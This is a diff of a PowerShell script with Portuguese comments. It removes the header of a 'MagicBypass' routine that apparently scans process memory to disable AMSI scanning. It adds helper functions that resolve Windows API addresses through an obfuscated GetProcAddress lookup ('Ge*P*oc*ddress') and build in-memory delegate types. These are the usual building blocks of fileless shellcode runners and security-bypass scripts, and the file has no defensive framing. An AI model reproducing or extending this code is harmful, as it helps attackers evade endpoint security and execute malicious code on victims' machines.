@@ -1,29 +1,36 @@
-# Parte 1
-function MagicBypass {
-<#
-.SYNOPSIS
-    This script demonstrates taking arguments with named parameters.
+# Função para buscar uma função em uma DLL específica
+function LookupFunc {
+    Param ($moduleName, $functionName)
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+     Equals('System.dll')
+     }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -like "Ge*P*oc*ddress") {$tmp+=$_}}
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
+@($moduleName)), $functionName))
+}
 
-.DESCRIPTION
-    This script takes 4 arguments with names and displays them.
+# Função para gerar um tipo delegado dinâmico
+function getDelegateType {
+    Param (
+     [Parameter(Position = 0, Mandatory = $True)] [Type[]]
+     $func, [Parameter(Position = 1)] [Type] $delType = [Void]
+    )
+    $type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+    DefineDynamicModule('InMemoryModule', $false).
+    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
+    AutoClass', [System.MulticastDelegate])
 
-.PARAMETER InitialStart
-    The negative offset from ScanContent that indicates where the search starts, it should be 0x50000 that indicates we will start searching -0x50000 bytes from ScanContent which is the universal and default value.
+    $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public',
+    [System.Reflection.CallingConventions]::Standard, $func).
+     SetImplementationFlags('Runtime, Managed')
 
-.PARAMETER NegativeOffset
-    The offset to substract in each loop to the $InitialStart which is 0x50000 by default => In each loop we will read another 0x50000 (Going Backwards)
-
-.PARAMETER MaxOffset
-    The total number of bytes you want to search
-
-.PARAMETER ReadBytes
-  The number of bytes to read with ReadProcessMemory at once. as we are going with chunks of 50k in each loop, we will as well read 50k at a time.
-#>
-
-# Define named parameters
-param(
-    $InitialStart = 0x50000,
-    $NegativeOffset= 0x50000,
-    $MaxOffset = 0x1000000,
-    $ReadBytes = 0x50000
-)
+    $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
+    $func). SetImplementationFlags('Runtime, Managed')
+    return $type.CreateType()
+}
